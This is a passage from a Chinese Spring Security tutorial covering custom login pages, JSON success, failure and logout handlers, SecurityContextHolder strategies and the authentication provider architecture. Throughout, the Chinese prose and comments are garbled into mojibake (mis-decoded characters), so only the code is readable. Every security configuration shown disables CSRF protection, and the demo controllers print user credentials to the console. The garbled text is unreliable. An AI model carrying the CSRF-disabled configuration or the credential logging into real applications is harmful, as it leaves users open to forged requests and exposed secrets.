åºäºååç«¯åç¦»çè®¤è¯æ¡ä¾\n * æ·»å è®¤è¯éªè¯ç \n\n\n# èªå®ä¹èµæºæéè§å\n\né»è®¤æåµä¸ï¼Spring Securityå¯¹ææå¾é¡µé¢åè®¤è¯è¦æ±ï¼æä»¬å¯ä»¥ä½¿ç¨èªå®ä¹çèµæºæéè§åéå¯¹ä¸åçè¯·æ±ï¼è®¾ç½®ä¸åçèµæºæéè§åã\n\nèªå®ä¹èµæºæéè§åéè¦å¨Spring Securityçéç½®æä»¶ä¸­æä½ï¼éç½®æä»¶éè¦ç»§æ¿WebSecurityConfigurerAdapterç±»ï¼å¹¶éåå¶ä¸­çconfigureæ¹æ³ãå¦ä¸æç¤ºï¼\n\npackage com.pwddd.springsecurity.config;\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/index")  // æ·»å å¹é\n      .permitAll()  // åè®¸å¨é¨\n      .anyRequest()  // ä»»æè¯·æ±\n      .authenticated()  // éè¦è®¤è¯\n      .and()  // å¹¶ä¸\n      .formLogin()  // è¡¨åç»é\n      .and()  \n      .csrf().disable();  // å³é­csrfæ»å»ä¿æ¤\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# èªå®ä¹è®¤è¯é¡µé¢\n\né»è®¤æä¾çç»éé¡µé¢æ¯ç±DefaultLoginPageGeneratingFilter.classç±»å¨é¡µé¢ä¸­æä¾çï¼é»è®¤çç»éè¯·æ±å°åä¸ºï¼/loginãæä»¬å¯ä»¥ä¿®æ¹é»è®¤çç»éé¡µé¢ã\n\n# 0. ç¼åç»éé¡µé¢\n\n<!DOCTYPE html>\n<html lang="en" xmlns:th="http://www.thymeleaf.org">\n<head>\n    <meta charset="UTF-8">\n    <title>Login</title>\n</head>\n<body>\n    <h2>ç»é</h2>\n    <form th:action="@{/doLogin}" method="post">\n        ç¨æ·åï¼<input type="text" name="uname" ><br>\n        å¯ ç ï¼<input type="password" name="passwd"/> <br>\n        <input type="submit" value="æäº¤">\n    </form>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 1. è®¾ç½®å°ç»å½é¡µé¢çè·¯ç±\n\nregistry.addViewController("/login").setViewName("login");\n\n\n1\n\n\n# 2. è®¾ç½®ç»å½ä¿¡æ¯\n\n@Override\nprotected void configure(HttpSecurity http) throws Exception {\n  http.authorizeRequests()\n    .mvcMatchers("/login").permitAll() // å¿é¡»æ¾å¼å½åç»å½é¡µé¢çè®¤è¯\n    .mvcMatchers("/index").permitAll()\n    .anyRequest()\n    .authenticated()\n    .and()\n    .formLogin()\n    .loginPage("/login")  // è®¾ç½®ç»å½é¡µé¢\n    .loginProcessingUrl("/doLogin")  // è®¾ç½®ç»å½çè¯·æ±å°å\n    //.successForwardUrl("/hello")  // è®¾ç½®æååçè½¬åå°å\n    .defaultSuccessUrl("/hello")  // è®¾ç½®æåéå®åå°å\n    .usernameParameter("uname")  // è®¾ç½®è¯·æ±ç¨æ·ååæ°å\n    .passwordParameter("passwd") // è®¾ç½®è¯·æ±å¯ç åæ°å\n    .and()\n    .csrf().disable();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nsuccessForwardUrl ãdefaultSuccessUrl è¿ä¸¤ä¸ªæ¹æ³é½å¯ä»¥å®ç°æåä¹åè·³è½¬\n\n * successForwardUrl é»è®¤ä½¿ç¨ forwardè·³è½¬ æ³¨æ:ä¸ä¼è·³è½¬å°ä¹åè¯·æ±è·¯å¾\n * defaultSuccessUrl é»è®¤ä½¿ç¨ redirect è·³è½¬ æ³¨æ:å¦æä¹åè¯·æ±è·¯å¾,ä¼æä¼åè·³è½¬ä¹åè¯·æ±è·¯å¾,å¯ä»¥ä¼ å¥ç¬¬äºä¸ªåæ°è¿è¡ä¿®æ¹\n\n\n# èªå®ä¹è®¤è¯æåå¤ç\n\nå¨ååç«¯åç¦»å¼åä¸­ï¼æä»¬ç»éæååå¾å¾ä¸æ¯è·³è½¬å°æä¸ªé¡µé¢ï¼èæ¯è¿ååç«¯ä¸æ®µjsonæ ¼å¼çæ°æ®ãé£ä¹å°±ä¸è½ä½¿ç¨è½¬åæèéå®åå°ä¸ä¸ªå°åãæä»¬å¯ä»¥éè¿èªå®ä¹çè®¤è¯æåå¤çå¨å®ç°AuthenticationSuccessHandlerã\n\npublic interface AuthenticationSuccessHandler {\n\n\t/**\n\t * Called when a user has been successfully authenticated.\n\t * @param request the request which caused the successful authentication\n\t * @param response the response\n\t * @param authentication the <tt>Authentication</tt> object which was created during\n\t * the authentication process.\n\t */\n\tvoid onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response,\n\t\t\tAuthentication authentication) throws IOException, ServletException;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ ¹æ®æ¥å£çæè¿°ä¿¡æ¯,ä¹å¯ä»¥å¾ç¥ç»å½æåä¼èªå¨åè°è¿ä¸ªæ¹æ³ï¼è¿ä¸æ­¥æ¥çå®çé»è®¤å®ç°ï¼ä½ ä¼åç°successForwardUrlãdefaultSuccessUrlä¹æ¯ç±å®çå­ç±»å®ç°ç\n\n\n\n# 0. èªå®ä¹è®¤è¯æåå¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.web.authentication.AuthenticationSuccessHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("msg","ç»éæåï¼");\n        hashMap.put("code",200);\n        response.setContentType("application/json;charset=utf8");\n        String result = new ObjectMapper().writeValueAsString(hashMap);\n        response.getWriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. éç½®èªå®ä¹å¤çå¨\n\n.successHandler(new CustomerAuthenticationSuccessHandler())\n\n\n1\n\n\nè¿æ ·éç½®ä¹åï¼ç»éæåå°±ä¼ä½¿ç¨æä»¬æå®çè®¤è¯æåå¤çå¨ã\n\n\n\n\n# èªå®ä¹è®¤è¯å¤±è´¥å¤ç\n\n# é¡µé¢å±ç¤ºå¤±è´¥ä¿¡æ¯\n\nä¸ºäºè½æ´ç´è§å¨ç»å½é¡µé¢çå°å¼å¸¸éè¯¯ä¿¡æ¯ï¼å¯ä»¥å¨ç»å½é¡µé¢ä¸­ç´æ¥è·åå¼å¸¸ä¿¡æ¯ãSpring Security å¨ç»å½å¤±è´¥ä¹åä¼å°å¼å¸¸ä¿¡æ¯å­å¨å° request ãsessionä½ç¨åä¸­ key ä¸º SPRING_SECURITY_LAST_EXCEPTION å½åå±æ§ä¸­ï¼æºç å¯ä»¥åè SimpleUrlAuthenticationFailureHandler ï¼\n\n\n\næä»¬å¯ä»¥å¨ç»å½å¤±è´¥è·³è½¬é¡µé¢ä¸è·åç»å½å¤±è´¥ä¿¡æ¯ï¼ç¶åå±ç¤ºå°é¡µé¢ã\n\n# 0.è®¾ç½®é¡µé¢å±ç¤º\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <title>ä¸»é¡µ</title>\n  </head>\n  <body>\n    <p th:text="${SPRING_SECURITY_LAST_EXCEPTION}"></p>\n    <h1>hello world</h1>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 1. è®¾ç½®éè¯¯è·³è½¬é¡µé¢\n\nè·³è½¬åæåè·³è½¬ä¸æ ·ï¼åä¸º\n\n * éå®åï¼éè¯¯ä¿¡æ¯å­å¨å°Sessionåä¸­ï¼éè¦ä»Sessionååã\n * è½¬åï¼éè¯¯ä¿¡æ¯å­å¨å°requeståä¸­ï¼éè¦ä»requestååã\n   * å¨è½¬åæ¶éè¦æ³¨æï¼ä¸è½ä½¿ç¨addViewControllerï¼å¦åä¼æ¥éï¼æ æ³è§£æPOSTè¯·æ±ã\n\n//                .failureUrl("/index")  // éå®å\n.failureForwardUrl("/login")  // è½¬å\n\n\n1\n2\n\n\nè®¾ç½®å®æä¹åï¼ç»å½å¤±è´¥å°±å¯ä»¥è·³è½¬å°æå®é¡µé¢ï¼å¹¶æ¾ç¤ºé¡µé¢ä¸çéè¯¯ä¿¡æ¯äºã\n\n# èªå®ä¹è®¤è¯å¤±è´¥å¤çå¨\n\nåä¸é¢çæåä¸æ ·ï¼ä¸ºäºéåååç«¯åç¦»ï¼ç»å½å¤±è´¥ä¹å¯ä»¥èªå®ä¹å¤±è´¥å¤çå¨ï¼è¿åä¸ä¸ªjsonç»åç«¯ã\n\n# 0. èªå®ä¹å¤±è´¥å¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.authentication.AuthenticationFailureHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerAuthenticationFailureHandler implements AuthenticationFailureHandler {\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("msg","è®¤è¯å¤±è´¥");\n        hashMap.put("code",400);\n        response.setContentType("application/json;charset=utf8");\n        String result = new ObjectMapper().writeValueAsString(hashMap);\n        response.getWriter().write(result);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 1. éç½®è®¤è¯å¤±è´¥å¤çå¨\n\n.failureHandler(new CustomerAuthenticationFailureHandler())\n\n\n1\n\n\n\n# èªå®ä¹æ³¨éå¤ç\n\nSpring Security ä¸­ä¹æä¾äºé»è®¤çæ³¨éç»å½éç½®ï¼å¨å¼åæ¶ä¹å¯ä»¥æç§èªå·±éæ±å¯¹æ³¨éè¿è¡ä¸ªæ§åå®å¶ãé»è®¤çæ³¨éè¯·æ±å°åä¸º/logoutï¼å æ­¤åªéè¦åégetè¯·æ±å°å½åçå°åå³å¯å®ææ³¨éã\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeHttpRequests()\n      //...\n      .and()\n      .formLogin()\n      //...\n      .and()\n      .logout()\n      .logoutUrl("/logout")\n      .invalidateHttpSession(true)\n      .clearAuthentication(true)\n      .logoutSuccessUrl("/login.html")\n      .and()\n      .csrf().disable();//è¿éåå³é­ CSRF\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * éè¿ logout() æ¹æ³å¼å¯æ³¨ééç½®\n * logoutUrl æå®éåºç»å½è¯·æ±å°åï¼é»è®¤æ¯ GET è¯·æ±ï¼è·¯å¾ä¸º /logout\n * invalidateHttpSession éåºæ¶æ¯å¦æ¯ session å¤±æï¼é»è®¤å¼ä¸º true\n * clearAuthentication éåºæ¶æ¯å¦æ¸é¤è®¤è¯ä¿¡æ¯ï¼é»è®¤å¼ä¸º true\n * logoutSuccessUrl éåºç»å½æ¶è·³è½¬å°å\n\nåæ¶ï¼spring securityä¹æä¾äºä¸ªæ§åå®å¶çå¯è½ï¼æ¯æéç½®å¤ä¸ªæ³¨éè¯·æ±å°åï¼åè¯·æ±æ¹å¼ãåæ¶ä¸ºäºæ´å¥½çééååç«¯åç¦»çç³»ç»ï¼æ¯æèªå®ä¹æ³¨éå¤çå¨ã\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n\t\t@Override\n    protected void configure(HttpSecurity http) throws Exception {\n        http.authorizeHttpRequests()\n                //...\n                .and()\n                .formLogin()\n                //...\n                .and()\n                .logout()\n                .logoutRequestMatcher(new OrRequestMatcher(\n                        new AntPathRequestMatcher("/logout1","GET"),\n                        new AntPathRequestMatcher("/logout","GET")\n                ))\n                .invalidateHttpSession(true)\n                .clearAuthentication(true)\n                .logoutSuccessUrl("/login.html")\n                .and()\n                .csrf().disable();//è¿éåå³é­ CSRF\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# èªå®ä¹æ³¨éå¤çå¨\n\npackage com.pwddd.springsecurity.config.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.web.authentication.logout.LogoutSuccessHandler;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.HashMap;\n\npublic class CustomerLogoutSuccessHandler implements LogoutSuccessHandler {\n    @Override\n    public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {\n        HashMap<String, Object> hashMap = new HashMap<>();\n        hashMap.put("code",200);\n        hashMap.put("msg","æ³¨éæåï¼");\n        String re = new ObjectMapper().writeValueAsString(hashMap);\n        response.setContentType("application/json;charset=utf8");\n        response.getWriter().write(re);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\néç½®å¤çå¨\n\n.logoutSuccessHandler(new CustomerLogoutSuccessHandler())\n\n\n1\n\n\n\n# ç»éæååçä¿¡æ¯è·å\n\n# SecurityContextHolder\n\nSpring Security ä¼å°ç»å½ç¨æ·æ°æ®ä¿å­å¨ Session ä¸­ãä½æ¯ï¼ä¸ºäºä½¿ç¨æ¹ä¾¿,Spring Securityå¨æ­¤åºç¡ä¸è¿åäºä¸äºæ¹è¿ï¼å¶ä¸­æä¸»è¦çä¸ä¸ªååå°±æ¯çº¿ç¨ç»å®ãå½ç¨æ·ç»å½æåå,Spring Security ä¼å°ç»å½æåçç¨æ·ä¿¡æ¯ä¿å­å° SecurityContextHolder ä¸­ã\n\nSecurityContextHolder ä¸­çæ°æ®ä¿å­é»è®¤æ¯éè¿ThreadLocal æ¥å®ç°çï¼ä½¿ç¨ ThreadLocal åå»ºçåéåªè½è¢«å½åçº¿ç¨è®¿é®ï¼ä¸è½è¢«å¶ä»çº¿ç¨è®¿é®åä¿®æ¹ï¼ä¹å°±æ¯ç¨æ·æ°æ®åè¯·æ±çº¿ç¨ç»å®å¨ä¸èµ·ãå½ç»å½è¯·æ±å¤çå®æ¯åï¼Spring Security ä¼å° SecurityContextHolder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° Session ä¸­ï¼åæ¶å° SecurityContexHolder ä¸­çæ°æ®æ¸ç©ºãä»¥åæ¯å½æè¯·æ±å°æ¥æ¶ï¼Spring Security å°±ä¼åä» Session ä¸­ååºç¨æ·ç»å½æ°æ®ï¼ä¿å­å°SecurityContextHolder ä¸­ï¼æ¹ä¾¿å¨è¯¥è¯·æ±çåç»­å¤çè¿ç¨ä¸­ä½¿ç¨ï¼åæ¶å¨è¯·æ±ç»ææ¶å° SecurityContextHolder ä¸­çæ°æ®æ¿åºæ¥ä¿å­å° Session ä¸­ï¼ç¶åå°SecurityContextHolder ä¸­çæ°æ®æ¸ç©ºã\n\nå®éä¸ SecurityContextHolder ä¸­å­å¨æ¯ SecurityContextï¼å¨ SecurityContext ä¸­å­å¨æ¯ Authenticationã\n\n\n\nè¿ç§è®¾è®¡æ¯å¸åçç­ç¥è®¾è®¡æ¨¡å¼:\n\npublic class SecurityContextHolder {\n\tpublic static final String MODE_THREADLOCAL = "MODE_THREADLOCAL";\n\tpublic static final String MODE_INHERITABLETHREADLOCAL = "MODE_INHERITABLETHREADLOCAL";\n\tpublic static final String MODE_GLOBAL = "MODE_GLOBAL";\n\tprivate static final String MODE_PRE_INITIALIZED = "MODE_PRE_INITIALIZED";\n\tprivate static SecurityContextHolderStrategy strategy;\n  //....\n\tprivate static void initializeStrategy() {\n\t\tif (MODE_PRE_INITIALIZED.equals(strategyName)) {\n\t\t\tAssert.state(strategy != null, "When using " + MODE_PRE_INITIALIZED\n\t\t\t\t\t+ ", setContextHolderStrategy must be called with the fully constructed strategy");\n\t\t\treturn;\n\t\t}\n\t\tif (!StringUtils.hasText(strategyName)) {\n\t\t\t// Set default\n\t\t\tstrategyName = MODE_THREADLOCAL;\n\t\t}\n\t\tif (strategyName.equals(MODE_THREADLOCAL)) {\n\t\t\tstrategy = new ThreadLocalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyName.equals(MODE_INHERITABLETHREADLOCAL)) {\n\t\t\tstrategy = new InheritableThreadLocalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n\t\tif (strategyName.equals(MODE_GLOBAL)) {\n\t\t\tstrategy = new GlobalSecurityContextHolderStrategy();\n\t\t\treturn;\n\t\t}\n    //.....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 1. MODE THREADLOCALï¼è¿ç§å­æ¾ç­ç¥æ¯å° SecurityContext å­æ¾å¨ ThreadLocalä¸­ï¼å¤§å®¶ç¥é Threadlocal çç¹ç¹æ¯å¨åªä¸ªçº¿ç¨ä¸­å­å¨å°±è¦å¨åªä¸ªçº¿ç¨ä¸­è¯»åï¼è¿å¶å®éå¸¸éå web åºç¨ï¼å ä¸ºå¨é»è®¤æåµä¸ï¼ä¸ä¸ªè¯·æ±æ è®ºç»è¿å¤å° Filter å°è¾¾ Servletï¼é½æ¯ç±ä¸ä¸ªçº¿ç¨æ¥å¤ççãè¿ä¹æ¯ SecurityContextHolder çé»è®¤å­å¨ç­ç¥ï¼è¿ç§å­å¨ç­ç¥æå³çå¦æå¨å·ä½çä¸å¡å¤çä»£ç ä¸­ï¼å¼å¯äºå­çº¿ç¨ï¼å¨å­çº¿ç¨ä¸­å»è·åç»å½ç¨æ·æ°æ®ï¼å°±ä¼è·åä¸å°ã\n 2. MODE INHERITABLETHREADLOCALï¼è¿ç§å­å¨æ¨¡å¼éç¨äºå¤çº¿ç¨ç¯å¢ï¼å¦æå¸æå¨å­çº¿ç¨ä¸­ä¹è½å¤è·åå°ç»å½ç¨æ·æ°æ®ï¼é£ä¹å¯ä»¥ä½¿ç¨è¿ç§å­å¨æ¨¡å¼ã\n 3. MODE GLOBALï¼è¿ç§å­å¨æ¨¡å¼å®éä¸æ¯å°æ°æ®ä¿å­å¨ä¸ä¸ªéæåéä¸­ï¼å¨ JavaWebå¼åä¸­ï¼è¿ç§æ¨¡å¼å¾å°ä½¿ç¨å°ã\n\n# SecurityContextHolderStrategy\n\néè¿ SecurityContextHolder å¯ä»¥å¾ç¥ï¼SecurityContextHolderStrategy æ¥å£ç¨æ¥å®ä¹å­å¨ç­ç¥æ¹æ³\n\npublic interface SecurityContextHolderStrategy {\n\tvoid clearContext();\n\tSecurityContext getContext();\n\tvoid setContext(SecurityContext context);\n\tSecurityContext createEmptyContext();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¥å£ä¸­ä¸å±å®ä¹äºåä¸ªæ¹æ³ï¼\n\n * clearContextï¼è¯¥æ¹æ³ç¨æ¥æ¸é¤å­å¨ç SecurityContextå¯¹è±¡ã\n * getContextï¼è¯¥æ¹æ³ç¨æ¥è·åå­å¨ç SecurityContext å¯¹è±¡ã\n * setContextï¼è¯¥æ¹æ³ç¨æ¥è®¾ç½®å­å¨ç SecurityContext å¯¹è±¡ã\n * create Empty Contextï¼è¯¥æ¹æ³åç¨æ¥åå»ºä¸ä¸ªç©ºç SecurityContext å¯¹è±¡ã\n\n\n\nä»ä¸é¢å¯ä»¥çåºæ¯ä¸ä¸ªå®ç°ç±»å¯¹åºä¸ç§ç­ç¥çå®ç°ã\n\n# ä»£ç ä¸­è·åè®¤è¯ä¹åç¨æ·æ°æ®\n\n@RestController\npublic class HelloController {\n    @RequestMapping("/hello")\n    public String hello() {\n      Authentication authentication = SecurityContextHolder\n        .getContext().getAuthentication();\n      User principal = (User) authentication.getPrincipal();\n      System.out.println("èº«ä»½ :"+principal.getUsername());\n      System.out.println("å­è¯ :"+authentication.getCredentials());\n      System.out.println("æé :"+authentication.getAuthorities());\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# å¤çº¿ç¨æåµä¸è·åç¨æ·æ°æ®\n\n@RestController\npublic class HelloController {\n    @RequestMapping("/hello")\n    public String hello() {\n      new Thread(()->{\n        Authentication authentication = SecurityContextHolder\n          .getContext().getAuthentication();\n        User principal = (User) authentication.getPrincipal();\n        System.out.println("èº«ä»½ :"+principal.getUsername());\n        System.out.println("å­è¯ :"+authentication.getCredentials());\n        System.out.println("æé :"+authentication.getAuthorities());\n      }).start();\n      return "hello security";\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n\nå¯ä»¥çå°é»è®¤ç­ç¥ï¼æ¯æ æ³å¨å­çº¿ç¨ä¸­è·åç¨æ·ä¿¡æ¯ï¼å¦æéè¦å¨å­çº¿ç¨ä¸­è·åå¿é¡»ä½¿ç¨ç¬¬äºç§ç­ç¥ï¼é»è®¤ç­ç¥æ¯éè¿ System.getProperty å è½½çï¼å æ­¤æä»¬å¯ä»¥éè¿å¢å  VM Options åæ°è¿è¡ä¿®æ¹ã\n\n-Dspring.security.strategy=MODE_INHERITABLETHREADLOCAL\n\n\n1\n\n\n\n\n# é¡µé¢ä¸è·åç¨æ·ä¿¡æ¯\n\n * å¼å¥ä¾èµ\n   \n   <dependency>\n     <groupId>org.thymeleaf.extras</groupId>\n     <artifactId>thymeleaf-extras-springsecurity5</artifactId>\n     <version>3.0.4.RELEASE</version>\n   </dependency>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * é¡µé¢å å¥å½åç©ºé´\n   \n   <html lang="en" xmlns:th="https://www.thymeleaf.org" \n   xmlns:sec="http://www.thymeleaf.org/extras/spring-security">\n   \n   \n   1\n   2\n   \n\n * é¡µé¢ä¸­ä½¿ç¨\n   \n   \x3c!--è·åè®¤è¯ç¨æ·å--\x3e\n   <ul>\n     <li sec:authentication="principal.username"></li>\n     <li sec:authentication="principal.authorities"></li>\n     <li sec:authentication="principal.accountNonExpired"></li>\n     <li sec:authentication="principal.accountNonLocked"></li>\n     <li sec:authentication="principal.credentialsNonExpired"></li>\n   </ul>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n\n\n# èªå®ä¹è®¤è¯æ°æ®æº\n\n# è®¤è¯æµç¨åæ\n\nhttps://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\n * åèµ·è®¤è¯è¯·æ±ï¼è¯·æ±ä¸­æºå¸¦ç¨æ·åãå¯ç ï¼è¯¥è¯·æ±ä¼è¢«UsernamePasswordAuthenticationFilter æ¦æª\n * å¨UsernamePasswordAuthenticationFilterçattemptAuthenticationæ¹æ³ä¸­å°è¯·æ±ä¸­ç¨æ·ååå¯ç ï¼å°è£ä¸ºAuthenticationå¯¹è±¡ï¼å¹¶äº¤ç»AuthenticationManager è¿è¡è®¤è¯\n * è®¤è¯æåï¼å°è®¤è¯ä¿¡æ¯å­å¨å° SecurityContextHodler ä»¥åè°ç¨è®°ä½æç­ï¼å¹¶åè° AuthenticationSuccessHandler å¤ç\n * è®¤è¯å¤±è´¥ï¼æ¸é¤ SecurityContextHodler ä»¥å è®°ä½æä¸­ä¿¡æ¯ï¼åè° AuthenticationFailureHandler å¤ç\n\n# ä¸èå³ç³»\n\nä»ä¸é¢åæä¸­å¾ç¥ï¼AuthenticationManager æ¯è®¤è¯çæ ¸å¿ç±»ï¼ä½å®éä¸å¨åºå±çæ­£è®¤è¯æ¶è¿ç¦»ä¸å¼ ProviderManager ä»¥å AuthenticationProvider ãä»ä»¬ä¸èå³ç³»æ¯æ ·çå¢ï¼\n\n * AuthenticationManager æ¯ä¸ä¸ªè®¤è¯ç®¡çå¨ï¼å®å®ä¹äº Spring Security è¿æ»¤å¨è¦æ§è¡è®¤è¯æä½ã\n * ProviderManager AuthenticationManageræ¥å£çå®ç°ç±»ãSpring Security è®¤è¯æ¶é»è®¤ä½¿ç¨å°±æ¯ ProviderManagerã\n * AuthenticationProvider å°±æ¯éå¯¹ä¸åçèº«ä»½ç±»åæ§è¡çå·ä½çèº«ä»½è®¤è¯ã\n\nAuthenticationManager ä¸ ProviderManager\n\n\n\nProviderManager æ¯ AuthenticationManager çå¯ä¸å®ç°ï¼ä¹æ¯ Spring Security é»è®¤ä½¿ç¨å®ç°ãä»è¿éä¸é¾çåºé»è®¤æåµä¸AuthenticationManager å°±æ¯ä¸ä¸ªProviderManagerã\n\nProviderManager ä¸ AuthenticationProvider\n\næèªå®æ¹: https://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html\n\n\n\nå¨ Spring Seourity ä¸­ï¼åè®¸ç³»ç»åæ¶æ¯æå¤ç§ä¸åçè®¤è¯æ¹å¼ï¼ä¾å¦åæ¶æ¯æç¨æ·å/å¯ç è®¤è¯ãReremberMe è®¤è¯ãææºå·ç å¨æè®¤è¯ç­ï¼èä¸åçè®¤è¯æ¹å¼å¯¹åºäºä¸åçAuthenticationProviderï¼æä»¥ä¸ä¸ªå®æ´çè®¤è¯æµç¨å¯è½ç±å¤ä¸ªAuthenticationProvideræ¥æä¾ã\n\nå¤ä¸ª AuthenticationProvider å°ç»æä¸ä¸ªåè¡¨ï¼è¿ä¸ªåè¡¨å°ç± ProviderManager ä»£çãæ¢å¥è¯è¯´ï¼å¨ProviderManager ä¸­å­å¨ä¸ä¸ª AuthenticationProvider åè¡¨ï¼å¨Provider Manager ä¸­éååè¡¨ä¸­çæ¯ä¸ä¸ªAuthenticationProvider å»æ§è¡èº«ä»½è®¤è¯ï¼æç»å¾å°è®¤è¯ç»æã\n\nProviderManager æ¬èº«ä¹å¯ä»¥åéç½®ä¸ä¸ª AuthenticationManagerä½ä¸º parentï¼è¿æ ·å½ProviderManagerè®¤è¯å¤±è´¥ä¹åï¼å°±å¯ä»¥è¿å¥å° parent ä¸­åæ¬¡è¿è¡è®¤è¯ãçè®ºä¸æ¥è¯´ï¼ProviderManager ç parent å¯ä»¥æ¯ä»»æç±»åçAuthenticationManagerï¼ä½æ¯éå¸¸é½æ¯ç± ProviderManageræ¥æ®æ¼ parent çè§è²ï¼ä¹å°±æ¯ProviderManageræ¯ ProviderManagerç parentã\n\nProviderManageræ¬èº«ä¹å¯ä»¥æå¤ä¸ªï¼å¤ä¸ªProviderManager å±ç¨åä¸ä¸ª parentãææ¶ï¼ä¸ä¸ªåºç¨ç¨åºæåä¿æ¤èµæºçé»è¾ç»ï¼ä¾å¦ï¼ææç¬¦åè·¯å¾æ¨¡å¼çç½ç»èµæºï¼å¦/api/**ï¼ï¼æ¯ä¸ªç»å¯ä»¥æèªå·±çä¸ç¨ AuthenticationManagerãéå¸¸ï¼æ¯ä¸ªç»é½æ¯ä¸ä¸ªProviderManagerï¼å®ä»¬å±äº«ä¸ä¸ªç¶çº§ãç¶åï¼ç¶çº§æ¯ä¸ç§ å¨å±èµæºï¼ä½ä¸ºæææä¾èçåå¤èµæºã\n\næ ¹æ®ä¸é¢çä»ç»ï¼æä»¬ç»åºæ°ç AuthenticationManagerãProvideManager å AuthentictionProviderå³ç³»\n\næèªå®ç½: https://spring.io/guides/topicals/spring-security-architecture\n\n\n\nå¼æ¸æ¥è®¤è¯åçä¹åæä»¬æ¥çä¸å·ä½è®¤è¯æ¶æ°æ®æºçè·åã**é»è®¤æåµä¸ AuthenticationProvider æ¯ç± DaoAuthenticationProvider ç±»æ¥å®ç°è®¤è¯çï¼å¨DaoAuthenticationProvider è®¤è¯æ¶åéè¿ UserDetailsService å®ææ°æ®æºçæ ¡éªã**ä»ä»¬ä¹é´è°ç¨å³ç³»å¦ä¸ï¼\n\n\n\næ»ç»: AuthenticationManager æ¯è®¤è¯ç®¡çå¨ï¼å¨ Spring Security ä¸­æå¨å±AuthenticationManagerï¼ä¹å¯ä»¥æå±é¨AuthenticationManagerãå¨å±çAuthenticationManagerç¨æ¥å¯¹å¨å±è®¤è¯è¿è¡å¤çï¼å±é¨çAuthenticationManagerç¨æ¥å¯¹æäºç¹æ®èµæºè®¤è¯å¤çãå½ç¶æ è®ºæ¯å